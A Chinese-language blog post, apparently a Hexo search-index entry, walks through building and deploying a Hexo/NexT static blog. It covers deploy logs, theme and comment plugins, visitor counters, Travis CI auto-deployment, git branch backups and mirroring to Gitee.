Generated: index.htmlINFO Generated: archives/index.htmlINFO Generated: fancybox/fancybox_loading.gifINFO Generated: fancybox/fancybox_sprite@2x.pngINFO Generated: fancybox/jquery.fancybox.jsINFO Generated: fancybox/fancybox_overlay.pngINFO Generated: fancybox/jquery.fancybox.cssINFO Generated: fancybox/jquery.fancybox.pack.jsINFO Generated: fancybox/blank.gifINFO Generated: fancybox/fancybox_loading@2x.gifINFO Generated: fancybox/fancybox_sprite.pngINFO Generated: css/fonts/FontAwesome.otfINFO Generated: archives/2018/11/index.htmlINFO Generated: css/fonts/fontawesome-webfont.eotINFO Generated: archives/2018/index.htmlINFO Generated: fancybox/helpers/fancybox_buttons.pngINFO Generated: fancybox/helpers/jquery.fancybox-thumbs.jsINFO Generated: css/fonts/fontawesome-webfont.woffINFO Generated: fancybox/helpers/jquery.fancybox-buttons.cssINFO Generated: js/script.jsINFO Generated: fancybox/helpers/jquery.fancybox-buttons.jsINFO Generated: css/style.cssINFO Generated: fancybox/helpers/jquery.fancybox-thumbs.cssINFO Generated: 2018/11/20/hello-world/index.htmlINFO Generated: css/fonts/fontawesome-webfont.ttfINFO Generated: css/fonts/fontawesome-webfont.svgINFO Generated: css/images/banner.jpgINFO Generated: fancybox/helpers/jquery.fancybox-media.jsINFO 28 files generated in 1.13 s$ hexo dERROR Deployer not found: git$ npm install hexo-deployer-git --savenpm WARN deprecated swig@1.4.2: This package is no longer maintainednpm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.2.4 (node_modules\fsevents):npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.4: wanted &#123;"os":"darwin","arch":"any"&#125; (current: &#123;"os":"win32","arch":"x64"&#125;)+ hexo-deployer-git@0.3.1added 31 packages in 17.866s$ hexo dINFO Deploying: gitINFO Setting up Git deployment...Initialized empty Git repository in D:/code/hexo/blog/.deploy_git/.git/[master (root-commit) 9c86786] First commit Committer: unknown &lt;xxx@sina.com.cn&gt;Your name and email address were configured automatically basedon your username and hostname. Please check that they are accurate.You can suppress this message by setting them explicitly: git config --global user.name "Your Name" git config --global user.email you@example.comAfter doing this, you may fix the identity used for this commit with: git commit --amend --reset-author 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 placeholderINFO Clearing .deploy_git folder...INFO Copying files from public folder...INFO Copying files from extend dirs...warning: LF will be replaced by CRLF in 2018/11/20/hello-world/index.html.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in archives/2018/11/index.html.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in archives/2018/index.html.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in archives/index.html.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in css/style.css.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/helpers/jquery.fancybox-buttons.css.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/helpers/jquery.fancybox-buttons.js.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/helpers/jquery.fancybox-media.js.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/helpers/jquery.fancybox-thumbs.css.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/helpers/jquery.fancybox-thumbs.js.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/jquery.fancybox.css.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/jquery.fancybox.js.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/jquery.fancybox.pack.js.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in index.html.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in js/script.js.The file will have its original line endings in your working directory.[master b7f7580] Site updated: 2018-11-20 11:51:50 Committer: unknown &lt;xxx@sina.com.cn&gt;Your name and email address were configured automatically basedon your username and hostname. Please check that they are accurate.You can suppress this message by setting them explicitly: git config --global user.name "Your Name" git config --global user.email you@example.comAfter doing this, you may fix the identity used for this commit with: git commit --amend --reset-author 29 files changed, 5777 insertions(+) create mode 100644 2018/11/20/hello-world/index.html create mode 100644 archives/2018/11/index.html create mode 100644 archives/2018/index.html create mode 100644 archives/index.html create mode 100644 css/fonts/FontAwesome.otf create mode 100644 css/fonts/fontawesome-webfont.eot create mode 100644 css/fonts/fontawesome-webfont.svg create mode 100644 css/fonts/fontawesome-webfont.ttf create mode 100644 css/fonts/fontawesome-webfont.woff create mode 100644 css/images/banner.jpg create mode 100644 css/style.css create mode 100644 fancybox/blank.gif create mode 100644 fancybox/fancybox_loading.gif create mode 100644 fancybox/fancybox_loading@2x.gif create mode 100644 fancybox/fancybox_overlay.png create mode 100644 fancybox/fancybox_sprite.png create mode 100644 fancybox/fancybox_sprite@2x.png create mode 100644 fancybox/helpers/fancybox_buttons.png create mode 100644 fancybox/helpers/jquery.fancybox-buttons.css create mode 100644 fancybox/helpers/jquery.fancybox-buttons.js create mode 100644 fancybox/helpers/jquery.fancybox-media.js create mode 100644 fancybox/helpers/jquery.fancybox-thumbs.css create mode 100644 fancybox/helpers/jquery.fancybox-thumbs.js create mode 100644 fancybox/jquery.fancybox.css create mode 100644 fancybox/jquery.fancybox.js create mode 100644 fancybox/jquery.fancybox.pack.js create mode 100644 index.html create mode 100644 js/script.js delete mode 100644 placeholdergit@github.com: Permission denied (publickey).fatal: Could not read from remote repository.Please make sure you have the correct access rightsand the repository exists.FATAL Something's wrong. Maybe you can find the solution here: http://hexo.io/docs/troubleshooting.htmlError: git@github.com: Permission denied (publickey).fatal: Could not read from remote repository.Please make sure you have the correct access rightsand the repository exists. at ChildProcess.&lt;anonymous&gt; (D:\code\hexo\blog\node_modules\hexo-util\lib\spawn.js:37:17) at emitTwo (events.js:126:13) at ChildProcess.emit (events.js:214:7) at ChildProcess.cp.emit (D:\code\hexo\blog\node_modules\cross-spawn\lib\enoent.js:40:29) at maybeClose (internal/child_process.js:925:16) at Socket.stream.socket.on (internal/child_process.js:346:11) at emitOne (events.js:116:13) at Socket.emit (events.js:211:7) at Pipe._handle.close [as _onclose] (net.js:557:12)$ hexo dINFO Deploying: gitINFO Clearing .deploy_git folder...INFO Copying files from public folder...INFO Copying files from extend dirs...warning: LF will be replaced by CRLF in 2018/11/20/hello-world/index.html.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in archives/2018/11/index.html.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in archives/2018/index.html.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in archives/index.html.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in css/style.css.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/helpers/jquery.fancybox-buttons.css.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/helpers/jquery.fancybox-buttons.js.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/helpers/jquery.fancybox-media.js.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/helpers/jquery.fancybox-thumbs.css.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/helpers/jquery.fancybox-thumbs.js.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/jquery.fancybox.css.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/jquery.fancybox.js.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in fancybox/jquery.fancybox.pack.js.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in js/script.js.The file will have its original line endings in your working directory.On branch masternothing to commit, working tree cleanBranch 'master' set up to track remote branch 'master' from 'git@sushengbuhuo.github.com:sushengbuhuo/sushengbuhuo.github.io.git'.To sushengbuhuo.github.com:sushengbuhuo/sushengbuhuo.github.io.git + 3037877...b7f7580 HEAD -&gt; master (forced update)INFO Deploy done: git$ git clone https://github.com/iissnan/hexo-theme-next themes/nextCloning into 'themes/next'...remote: Enumerating objects: 12033, done.remote: Total 12033 (delta 0), reused 0 (delta 0), pack-reused 12033Receiving objects: 100% (12033/12033), 12.95 MiB | 79.00 KiB/s, done.Resolving deltas: 100% (6966/6966), done.$ hexo clean &amp;&amp; hexo gINFO Deleted database.INFO Deleted public folder.INFO Start processing$ hexo d$ hexo sINFO Start processingWARN ===============================================================WARN ========================= ATTENTION! ==========================WARN ===============================================================WARN NexT repository is moving here: https://github.com/theme-nextWARN ===============================================================WARN It's rebase to v6.0.0 and future maintenance will resume thereWARN ===============================================================INFO Hexo is running at http://localhost:4000 . Press Ctrl+C to stop 安装插件登录admin 即可看到我们所有的文章内容123456789101112131415161718192021222324252627282930313233343536373839404142434445λ npm i hexo-admin --savenpm WARN deprecated minimatch@2.0.10: Please update to minimatch 3.0.2 or higher to avoid a RegExp DoS issuenpm WARN deprecated connect@2.7.11: connect 2.x series is deprecatednpm WARN deprecated cryptiles@2.0.5: This version is no longer maintained. Please upgrade to the latest version.npm WARN deprecated boom@2.10.1: This version is no longer maintained. Please upgrade to the latest version.npm WARN deprecated hoek@2.16.3: This version is no longer maintained. Please upgrade to the latest version.npm WARN acorn-dynamic-import@4.0.0 requires a peer of acorn@^6.0.0 but none is installed. You must install peer dependencies yourself.npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.2.4 (node_modules\fsevents):npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.4: wanted &#123;"os":"darwin","arch":"any"&#125; (current: &#123;"os":"win32","arch":"x64"&#125;)+ hexo-admin@2.3.0added 251 packages in 23.975s ╭─────────────────────────────────────╮ │ │ │ Update available 5.6.0 → 6.4.1 │ │ Run npm i npm to update │ │ │ ╰─────────────────────────────────────╯#网站底部字数统计d:\code\hexo\blogλ npm install hexo-wordcount --savenpm WARN rollback Rolling back node-pre-gyp@0.10.0 failed (this is probably harmless): EPERM: operation not permitted, scandir 'd:\code\hexo\blog\node_modules\fsevents\node_modules'npm WARN acorn-dynamic-import@4.0.0 requires a peer of acorn@^6.0.0 but none is installed. You must install peer dependencies yourself.npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.2.4 (node_modules\fsevents):npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.4: wanted &#123;"os":"darwin","arch":"any"&#125; (current: &#123;"os":"win32","arch":"x64"&#125;)+ hexo-wordcount@6.0.1added 1 package in 10.289s搜索npm install hexo-generator-searchdb --save npm install hexo-generator-search --save在根目录下的/theme/next/_config.yml文件中添加配置：search: path: search.xml field: post format: html limit: 10000 在根目录下的/theme/next/_config.yml文件中搜索local_search，将enable改为true： local_search: enable: true 问题中文乱码 将config.yml 和md文件编码转为utf-8 修改config.yml language: zh-Hans 新建文章1$ hexo new "PHP依赖注入" Hexo 默认以标题做为文件名称，但您可编辑_config.yml new_post_name 参数来改变默认的文件名称，举例来说，设为 :year-:month-:day-:title.md 可让您更方便的通过日期来管理文章。 标签分类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152主菜单设置 blog/_config.yml 添加如下配置menu: home: / archives: /archives categories: /categories #手动新建 tags: /tags #手动新建 commonweal: /404.html #手动新建 about: /about #手动新建 next/_config.yml 添加如下配置menu: home: / || home about: /about/ || user tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive 标签云 页面命令hexo new page tags页面设置title: tagsdate: 2015-09-19 22:37:08type: "tags"comments: false---关于 页面命令hexo new page about页面设置title: aboutdate: 2015-09-19 22:37:08comments: false---About Me #这里编辑 '关于我' 的内容分类 页面命令hexo new page categories页面设置title: categoriesdate: 2015-09-19 22:37:08type: "categories"comments: false--- 显示统计字数和估计阅读时长1234567891011npm install hexo-wordcount --savevi blog\themes\hexo-theme-next\_config.ymlpost_wordcount: item_text: true wordcount: true min2read: true totalcount: false separated_meta: falsevi blog\themes\hexo-theme-next\layout\_macro\ **post.swig**文件 &#123;&#123; wordcount(post.content) &#125;&#125; 字 &#123;&#123; min2read(post.content) &#125;&#125; 分钟 显示总访客数和总浏览量12345678910111213141516171819202122232425262728293031323334353637383940414243vi D:\blog\themes\hexo-theme-next\layout_partials\ footer.swig首行添加如下代码：&lt;script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"&gt;&lt;/script&gt;#接着修改相应代码：# 添加总访客量&lt;span id="busuanzi_container_site_uv"&gt; 访客数:&lt;span id="busuanzi_value_site_uv"&gt;&lt;/span&gt;人次&lt;/span&gt;&#123;% if theme.footer.powered %&#125; &lt;!--&lt;div class="powered-by"&gt;&#123;# #&#125;&#123;&#123; __('footer.powered', '&lt;a class="theme-link" target="_blank" href="https://hexo.io"&gt;Hexo&lt;/a&gt;') &#125;&#125;&#123;##&#125;&lt;/div&gt;--&gt;&#123;% endif %&#125;# 添加'|'符号&#123;% if theme.footer.powered and theme.footer.theme.enable %&#125; &lt;span class="post-meta-divider"&gt;|&lt;/span&gt;&#123;% endif %&#125;&#123;% if theme.footer.custom_text %&#125; &lt;div class="footer-custom"&gt;&#123;# #&#125;&#123;&#123; theme.footer.custom_text &#125;&#125;&#123;##&#125;&lt;/div&gt;&#123;% endif %&#125;# 添加总访问量&lt;span id="busuanzi_container_site_pv"&gt; 总访问量:&lt;span id="busuanzi_value_site_pv"&gt;&lt;/span&gt;次&lt;/span&gt;# 添加'|'符号&#123;% if theme.footer.powered and theme.footer.theme.enable %&#125; &lt;span class="post-meta-divider"&gt;|&lt;/span&gt;&#123;% endif %&#125;# 添加博客全站共：&lt;div class="theme-info"&gt; &lt;div class="powered-by"&gt;&lt;/div&gt; &lt;span class="post-count"&gt;博客全站共&#123;&#123; totalcount(site) &#125;&#125;字&lt;/span&gt;&lt;/div&gt; 备份文章123456789101112131415161718192021222324252627282930313233343536373839404142434445464748将themes/next/(我用的是NexT主题)中的.git/删除，否则无法将主题文件夹push；在本地blog文件夹下创建文件.gitignore(一般都自带一个)，打开后写入 https://yfzhou.coding.me/2018/09/17/Hexo-Next%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88Hexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E4%BB%BD%EF%BC%89/.DS_StoreThumbs.dbdb.json*.lognode_modules/public/.deploy*/在本地blog文件夹下执行命令#git初始化git init#创建hexo分支，用来存放源码git checkout -b hexo#git 文件添加git add .#git 提交git commit -m "init"#添加远程仓库git remote add origin git@github.com:sushengbuhuo/sushengbuhuo.github.io.git#push到hexo分支git push origin hexo执行hexo d -g生成网站并部署到GitHub上这样一来，在GitHub上的git@github.com:sushengbuhuo/sushengbuhuo.github.io.git仓库就有两个分支，一个hexo分支用来存放网站的原始文件，一个master分支用来存放生成的静态网页。当重装电脑之后，或者想在其他电脑上修改博客，可以使用下列步骤：1、先安装hexo$ npm install -g hexo-cli2、存在github上的git clone下来git clone git@github.com:sushengbuhuo/sushengbuhuo.github.io.git3、项目文件夹下npmcd项目名/ npm install –no-bin-links$ npm install hexo-deployer-git4、重新配置github和coding的公钥每次写作之后,可以使用下列步骤：hexo d#生成网站并部署到GitHub上git add .git commit -m 'update'git push origin hexo 添加gitter在线交流用GitHub登录 https://gitter.im1234567891011121314vi next/layout/_third-party/gitter.swig&lt;script&gt; ((window.gitter = &#123;&#125;).chat = &#123;&#125;).options = &#123; //room替换成自己的聊天室名称即可，room的名称规则是：username/roomname //http://www.xetlab.com/2019/04/14/%E7%BB%99%E5%9F%BA%E4%BA%8EHEXO%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0gitter%E5%9C%A8%E7%BA%BF%E4%BA%A4%E6%B5%81/ room: 'sushengbuhuo/chat' &#125;;&lt;/script&gt;&lt;script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer&gt;&lt;/script&gt;vi next/layout/layout/_layout.swig&#123;% include '_third-party/gitter.swig' %&#125; 增加评论utterance123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960https://www.njphper.com/posts/a4cd94b2.html通过https://github.com/apps/utterances 用GitHub登录，然后设置一个公开目录接受评论。比如 sushengbuhuo/laravel_ioc_demo&lt;script src="https://utteranc.es/client.js" repo="sushengbuhuo/laravel_ioc_demo" issue-term="pathname" label="susheng" theme="github-light" crossorigin="anonymous" async&gt;&lt;/script&gt;vi _confgi.yml 增加utterance: enable: true repo: sushengbuhuo/laravel_ioc_demo theme: github-light issue-term: pathname评论主题的 theme 选项如下:github-lightgithub-darkgithub-dark-orangeicy-darkdark-bluephoton-dark评论 issue-term 映射配置选项如下：pathnameurltitleog:titleissue-numberspecific-termvi thems\next\layout\_third-party\comments\utterance.swig&lt;script type="text/javascript"&gt; (function() &#123; // 匿名函数，防止污染全局变量 var utterances = document.createElement('script'); utterances.type = 'text/javascript'; utterances.async = true; utterances.setAttribute('issue-term','&#123;&#123; theme.utterance.issue-item &#125;&#125;') utterances.setAttribute('theme','&#123;&#123; themm.utterance.theme &#125;&#125;') utterances.setAttribute('repo','&#123;&#123; theme.utterance.repo &#125;&#125;') utterances.crossorigin = 'anonymous'; utterances.src = 'https://utteranc.es/client.js'; // content 是要插入评论的地方 document.getElementById('gitment-container').appendChild(utterances); &#125;)();&lt;/script&gt;vi thems\next\layout\_partials\comments.swig&#123;% endif %&#125;之前添加&#123;% elif theme.utterance.enable %&#125; &lt;div class="comments" id="comments"&gt; &lt;div id="gitment-container"&gt;&lt;/div&gt; &lt;/div&gt; vi thems\next\layout\_third-party\comments\index.swig &#123;% include 'utterance.swig' %&#125; 评论后内容在 https://github.com/sushengbuhuo/laravel_ioc_demo/issues 备份到GitHub1234567891011121314151617181920212223242526https://github.com/coneycode/hexo-git-backupif your hexo version is 2.x.x, you should install as follow:$ npm install hexo-git-backup@0.0.91 --saveif version is 3.x.x, you should install as follow:$ npm install hexo-git-backup --saveUpdateif you install with --save, you must remove firstly when you update it.$ npm remove hexo-git-backup$ npm install hexo-git-backup --saveConfigureYou should configure this plugin in _config.yml.backup: type: git repository: github: git@github.com:xxx/xxx.git,branchName gitcafe: git@github.com:xxx/xxx.git,branchName hexo b 微博图床失效问题1234567打开/themes/next/layout/_partials/head.swig文件,添加一行代码：&lt;meta name="referrer" content="no-referrer" /&gt;,具体如下所示：&lt;meta charset="UTF-8"/&gt;&lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;&lt;meta name="referrer" content="no-referrer" /&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/&gt;&lt;meta name="theme-color" content="&#123;&#123; theme.android_chrome_color &#125;&#125;"&gt;https://xuezheng-wei.com/posts/d970820/ Travis CI 自动部署12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152新建hexo分支添加 .travis.yml 在博客源文件根目录下并上传:language: node_jsnode_js: stablecache: directories: - node_modulesbefore_install: - npm install hexo-cli -ginstall: - npm install - npm install hexo-deployer-git --savescript: - hexo clean - hexo generateafter_script: - cd ./public - git init - git config user.name "username" - git config user.email "useremail" - git add . - git commit -m "Update docs" - git push --force --quiet "https://$&#123;GH_TOKEN&#125;@$&#123;GH_REF&#125;" master:masterbranches: only: - hexoenv: global: - GH_REF: github.com/username/username.github.io.git （三）配置GitHub Access Token： GitHub 主页 ——&gt; Settings ——&gt; Developer Settings ——&gt; Personal access tokens ——&gt; Generate new token （四）Travis CI 设置： （1）登录 https://travis-ci.org/ 网站用 github 授权登录； （2）登录后在个人主页选择你需要 CI 的仓库； （3）点击你选择的 hexo 博客的仓库进行配置； （4）在 Travis 仓库配置界面 setting 里面对环境变量 Environment Variables 进行 token 配置； （五）撰写文章并 push 到 github pages： 每次写完文章，只需要执行下面的命令，其余部分会自动完成部署。https://xuezheng-wei.com/posts/8a945b8a/ git add . git commit -m "updated docs" git push origin hexo 博客备份123456789101112131415161718192021$ git init //git初始化$ git add . //git 文件添加$ git commit -m "init" //git 提交$ git pull origin hexo //pull到hexo分支$ git push origin hexo //push到hexo分支博客恢复（一）配置 ssh 连接 Github$ cd ~/.ssh 或cd .ssh //检查本机是否有ssh key设置$ cd ~ //若没有 ssh ，则切换当前路径在 ”~” 下$ ssh-keygen -t rsa -C "user@example.com" //引号内为自己邮箱，三个回车后生成ssh key;添加id_rsa.pub内容到Github;$ git config --global user.name “your_username” //设置用户名$ git config --global user.email “your_registered_github_Email” //设置邮箱地址(建议用注册giuhub的邮箱)$ ssh -T git@github.com //测试ssh key是否设置成功（二）安装 Node.js；Git；Hexo；$ git clone -b hexo git@github.com:user/user.github.io.git //将Github中hexo分支clone到本地$ cd user.github.io //切换到hexo目录下$ npm install hexo$ npm install $ npm install hexo *** //安装需要的插件：feed;deployer;abbrlink;sitemap;pdf;nofollow;baidu-url-submit等$ hexo g -d //测试能否正常编译上传https://xuezheng-wei.com/posts/45a0debd/ 图片防盗链123&lt;meta name="referrer" content="never" /&gt; ​​​​Next 主题只需要在 themes/next/layout/_partials/head/custom-head.swig 中添加上面一行内容即可https://michael728.github.io/2019/05/19/hexo-blog-full-note/ 文章加密12345678910111213141516171819202122232425262728293031打开themes-&gt;next-&gt;layout-&gt;_partials-&gt;head.swig文件,在以下位置插入这样一段代码：&lt;script&gt; (function () &#123; if ('&#123;&#123; page.password &#125;&#125;') &#123; if (prompt('请输入文章密码') !== '&#123;&#123; page.password &#125;&#125;') &#123; alert('密码错误！'); if (history.length === 1) &#123; location.replace("http://xxxxxxx.xxx"); // 这里替换成你的首页 &#125; else &#123; history.back(); &#125; &#125; &#125; &#125;)();&lt;/script&gt;在文章上写成类似这样---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;tags:description: copyright: categories:password: password---但是通过curl工具浏览网页是直接显示网页源代码就可以看到密码curl -L http://可以使用https://github.com/MikeCoder/hexo-blog-encrypt/blob/master/ReadMe.zh.md 这个插件加密https://www.jianshu.com/p/44e211829447 推送到gitee123456789101112131415161718192021222324252627282930313233343536373839404142434445464748创建项目 https://gitee.com/sushengbuhuo/sushengbuhuo 注意和GitHub不一样，项目名不是sushengbuhuo.gitee.iovi _config.ymldeploy: type: git repository: gitee: git@gitee.com:sushengbuhuo/sushengbuhuo.git github: git@sushengbuhuo.github.com:sushengbuhuo/sushengbuhuo.github.io.git branch: masterhexo d [master f11b6ad] Site updated: 2019-10-11 16:37:34 235 files changed, 248 insertions(+), 246 deletions(-)remote: Powered By Gitee.comBranch master set up to track remote branch master from git@gitee.com:sushengbuhuo/sushengbuhuo.git.To gitee.com:sushengbuhuo/sushengbuhuo.git + 538b9d3...f11b6ad HEAD -&gt; master (forced update)On branch master部署完后需要https://gitee.com/sushengbuhuo/sushengbuhuo/pages 自己手动更新部署。访问 https://sushengbuhuo.gitee.iogit checkout -b hexoλ git branch hexo* masterd:\code\hexo\blog (master)λ git remote add gitee git@gitee.com:sushengbuhuo/sushengbuhuo.gitd:\code\hexo\blog (master)λ git remote -vgitee git@gitee.com:sushengbuhuo/sushengbuhuo.git (fetch)gitee git@gitee.com:sushengbuhuo/sushengbuhuo.git (push)github git@sushengbuhuo.github.com:sushengbuhuo/sushengbuhuo.github.io.git (fetch)github git@sushengbuhuo.github.com:sushengbuhuo/sushengbuhuo.github.io.git (push)λ git push gitee hexoCounting objects: 580, done.Delta compression using up to 4 threads.Compressing objects: 100% (541/541), done.Writing objects: 100% (580/580), 2.21 MiB | 2.77 MiB/s, done.Total 580 (delta 33), reused 0 (delta 0)remote: Resolving deltas: 100% (33/33), done.remote: Powered By Gitee.comTo gitee.com:sushengbuhuo/sushengbuhuo.git * [new branch] hexo -&gt; hexo 新写文章文档 资源至简的 hexo 主题 开源的工具 HexoClient （跨平台的哦） next主题模板一些配置 动动手指，NexT主题与Hexo更搭哦（基础篇） Next 主题增加新的第三方评论系统 utterance Github Pages部署教程 GitHub.io 个人站点绑定独立的域名 打造个性超赞博客Hexo+NexT+GitHubPages的超深度优化 用Github+Hexo搭建你的个人博客：美化篇 hexo干货系列 hexo文档 hexo问题交流 Deployment 绝配：hexo+next主题及我走过的坑 Hexo+Pages静态博客-Next主题篇 hexo部署到服务器 关于HEXO搭建个人博客的点点滴滴 搭建博客 手把手教你用Hexo搭建个人技术博客 基于CentOS搭建Hexo博客 最快的 Hexo 博客搭建方法 超详细Hexo+Github博客搭建小白教程 在Github上备份Hexo博客 最快的 Hexo 博客搭建方法 Hugo是由Go语言实现的静态网站生成器 带点Geek味的独立博客 将 Hexo 博客发布到自己的服务器上 yilia主题 使用 Hugo 搭建博客 博客发布上线方案 — Hexo hexo博客 使用HEXO搭建博客 部署Hexo博客到Coding 用Github+Hexo搭建你的个人博客：美化篇 无后端评论系统 hexo博客专题 hexo博客添加标签功能 第三方评论系统 utterance Hexo + Github Pages 搭建博客并优化 Next 主题教程 博客看板娘]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
